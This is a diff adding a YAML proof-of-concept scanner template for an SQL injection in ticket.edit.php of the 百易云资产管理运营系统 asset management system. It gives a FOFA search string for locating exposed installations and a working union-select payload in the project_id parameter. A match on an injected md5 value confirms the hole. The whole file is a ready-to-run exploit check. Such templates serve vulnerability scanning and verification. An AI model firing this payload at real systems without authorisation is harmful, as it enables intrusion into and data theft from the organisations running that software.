@@ -1,0 +1,17 @@
+id: poc-yaml-baiyishequ-ticket-edit-sqli
+info:
+  name: 百易云资产管理运营系统 ticket.edit.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百易云资产管理运营系统
+  fofa: body="不要着急，点此"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /adminx/ticket.edit.php?project_id=-1%20union+select+1,md5({{.t1}}),3,4,5--+
+  expression: "status_code == 200 && \ncontains(body,t2) &&\ncontains(body,\"工单来源\"\
+    )\n"
+transport: http
